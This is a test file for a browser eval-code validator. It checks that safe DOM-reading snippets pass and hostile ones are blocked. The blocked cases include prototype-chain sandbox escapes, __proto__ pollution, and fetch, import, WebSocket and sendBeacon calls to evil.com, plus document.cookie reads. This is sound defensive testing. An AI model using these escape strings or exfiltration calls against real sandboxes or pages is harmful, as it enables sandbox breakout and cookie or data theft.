import { describe, expect, it } from "vitest";
import {
  validateBrowserEvalCode,
  assertSafeEvalCode,
  MAX_EVAL_CODE_LENGTH,
} from "./safe-eval-validator.js";

// ---------------------------------------------------------------------------
// Helper
// ---------------------------------------------------------------------------

function expectSafe(code: string): void {
  const result = validateBrowserEvalCode(code);
  expect(result, `Expected safe but got: ${JSON.stringify(result)}`).toEqual({ safe: true });
}

function expectBlocked(code: string, reasonSubstring?: string): void {
  const result = validateBrowserEvalCode(code);
  expect(result.safe, `Expected blocked but code was allowed: ${code}`).toBe(false);
  if (reasonSubstring && !result.safe) {
    expect(result.reason).toContain(reasonSubstring);
  }
}

// ===========================================================================
// SAFE PATTERNS — must NOT be rejected
// ===========================================================================

describe("validateBrowserEvalCode — safe patterns", () => {
  it("allows simple arrow function returning document.title", () => {
    expectSafe("() => document.title");
  });

  it("allows element-scoped arrow function", () => {
    expectSafe("(el) => el.textContent");
  });

  it("allows querySelector chain", () => {
    expectSafe('() => document.querySelector("h1").innerText');
  });

  it("allows classic function expression", () => {
    expectSafe("function() { return document.title; }");
  });

  it("allows Array.from with map", () => {
    expectSafe('() => Array.from(document.querySelectorAll("a")).map(a => a.href)');
  });

  it("allows JSON.parse of script content", () => {
    expectSafe('() => JSON.parse(document.querySelector("script[type=json]").textContent)');
  });

  it("allows getBoundingClientRect destructure", () => {
    expectSafe(
      "(el) => { const rect = el.getBoundingClientRect(); return { x: rect.x, y: rect.y }; }",
    );
  });

  it("allows async function with safe setTimeout wrapper", () => {
    expectSafe(
      "async () => { await new Promise(r => __safeSetTimeout__(r, 100)); return document.title; }",
    );
  });

  it("allows getComputedStyle", () => {
    expectSafe("() => getComputedStyle(document.body).backgroundColor");
  });

  it("allows bare expression (not a function)", () => {
    expectSafe("document.title");
  });

  it("allows string literal containing blocked identifier name", () => {
    expectSafe('() => "fetch is disabled"');
  });

  it("allows string containing constructor as text", () => {
    expectSafe('() => "the constructor pattern"');
  });

  it("allows dataset.fetch (non-computed property on user object)", () => {
    expectSafe("(el) => el.dataset.fetch");
  });

  it("allows scrollY read", () => {
    expectSafe("() => scrollY");
  });

  it("allows ternary expressions", () => {
    expectSafe('(el) => el.checked ? "yes" : "no"');
  });

  it("allows template literal without blocked identifiers", () => {
    expectSafe("(el) => `text: ${el.textContent}`");
  });

  it("allows object spread and rest", () => {
    expectSafe("(el) => ({ ...el.dataset })");
  });

  it("allows nested arrow functions", () => {
    expectSafe("() => [1,2,3].map(x => x * 2)");
  });
});

// ===========================================================================
// BLOCKED — Prototype chain / meta-programming (Layer 2 primary targets)
// ===========================================================================

describe("validateBrowserEvalCode — prototype chain attacks", () => {
  it("blocks .constructor access (prototype chain to Function)", () => {
    expectBlocked('() => ({}).constructor.constructor("return 1")()', "constructor");
  });

  it("blocks .constructor on string literal", () => {
    expectBlocked('() => "".constructor.constructor("return fetch")()', "constructor");
  });

  it("blocks .constructor on array literal", () => {
    expectBlocked('() => [].constructor.constructor("return fetch")()', "constructor");
  });

  it("blocks .constructor on regex literal", () => {
    expectBlocked('() => /x/.constructor.constructor("return fetch")()', "constructor");
  });

  it("blocks .__proto__ access", () => {
    expectBlocked("() => ({}).__proto__", "__proto__");
  });

  it("blocks Object.prototype assignment via __proto__", () => {
    expectBlocked('() => { ({}).__proto__.polluted = "true"; }', "__proto__");
  });
});

// ===========================================================================
// BLOCKED — Dynamic import
// ===========================================================================

describe("validateBrowserEvalCode — dynamic import", () => {
  it("blocks import() expression", () => {
    expectBlocked('() => import("https://evil.com/module.js")', "import");
  });
});

// ===========================================================================
// BLOCKED — Defense-in-depth identifier checks
// (Shadows are the primary defense, but AST layer also catches these)
// ===========================================================================

describe("validateBrowserEvalCode — blocked identifiers (defense-in-depth)", () => {
  it("blocks bare fetch identifier", () => {
    expectBlocked('() => fetch("https://evil.com")');
  });

  it("blocks fetch in aliasing pattern", () => {
    expectBlocked('() => { const f = fetch; f("https://evil.com"); }');
  });

  it("blocks fetch in array access", () => {
    expectBlocked('() => [fetch][0]("https://evil.com")');
  });

  it("blocks eval identifier", () => {
    expectBlocked('() => eval("alert(1)")');
  });

  it("blocks Function constructor identifier", () => {
    expectBlocked('() => new Function("return 1")()');
  });

  it("blocks XMLHttpRequest identifier", () => {
    expectBlocked("() => new XMLHttpRequest()");
  });

  it("blocks WebSocket identifier", () => {
    expectBlocked('() => new WebSocket("wss://evil.com")');
  });

  it("blocks EventSource identifier", () => {
    expectBlocked('() => new EventSource("https://evil.com/stream")');
  });

  it("blocks Image identifier", () => {
    expectBlocked("() => new Image()");
  });

  it("blocks Worker identifier", () => {
    expectBlocked('() => new Worker("worker.js")');
  });

  it("blocks SharedWorker identifier", () => {
    expectBlocked('() => new SharedWorker("worker.js")');
  });

  it("blocks importScripts identifier", () => {
    expectBlocked('() => importScripts("https://evil.com/script.js")');
  });
});

// ===========================================================================
// BLOCKED — Member expression checks (defense-in-depth)
// ===========================================================================

describe("validateBrowserEvalCode — blocked member expressions", () => {
  it("blocks document.cookie", () => {
    expectBlocked("() => document.cookie", "document.cookie");
  });

  it("blocks document.domain assignment", () => {
    expectBlocked('() => { document.domain = "evil.com"; }', "document.domain");
  });

  it("blocks document.write", () => {
    expectBlocked('() => document.write("<script>bad</script>")', "document.write");
  });

  it("blocks document.writeln", () => {
    expectBlocked('() => document.writeln("injected")', "document.writeln");
  });

  it("blocks navigator.sendBeacon", () => {
    expectBlocked('() => navigator.sendBeacon("https://evil.com", "data")', "navigator.sendBeacon");
  });
});

// ===========================================================================
// EDGE CASES
// ===========================================================================

describe("validateBrowserEvalCode — edge cases", () => {
  it("rejects empty string", () => {
    expectBlocked("", "empty");
  });

  it("rejects whitespace-only string", () => {
    expectBlocked("   ", "empty");
  });

  it("rejects unparseable code", () => {
    expectBlocked("{{{", "syntax");
  });

  it("rejects code exceeding max length", () => {
    const longCode = "() => " + '"a"'.repeat(MAX_EVAL_CODE_LENGTH);
    expectBlocked(longCode, "max length");
  });

  it("blocks nested functions containing blocked patterns", () => {
    expectBlocked('() => { function inner() { return fetch("evil.com"); } return inner(); }');
  });

  it("blocks blocked identifier inside try-catch", () => {
    expectBlocked('() => { try { fetch("evil.com"); } catch(e) {} }');
  });

  it("blocks blocked identifier in conditional", () => {
    expectBlocked('() => true ? fetch("evil.com") : null');
  });
});

// ===========================================================================
// assertSafeEvalCode (throwing wrapper)
// ===========================================================================

describe("assertSafeEvalCode", () => {
  it("does not throw for safe code", () => {
    expect(() => assertSafeEvalCode("() => document.title")).not.toThrow();
  });

  it("throws for blocked code with descriptive message", () => {
    expect(() => assertSafeEvalCode('() => fetch("evil.com")')).toThrow(
      "Blocked unsafe browser eval code",
    );
  });

  it("throws for empty code", () => {
    expect(() => assertSafeEvalCode("")).toThrow("Blocked unsafe browser eval code");
  });

  it("throws for .constructor access", () => {
    expect(() => assertSafeEvalCode('() => ({}).constructor.constructor("code")()')).toThrow(
      "constructor",
    );
  });
});
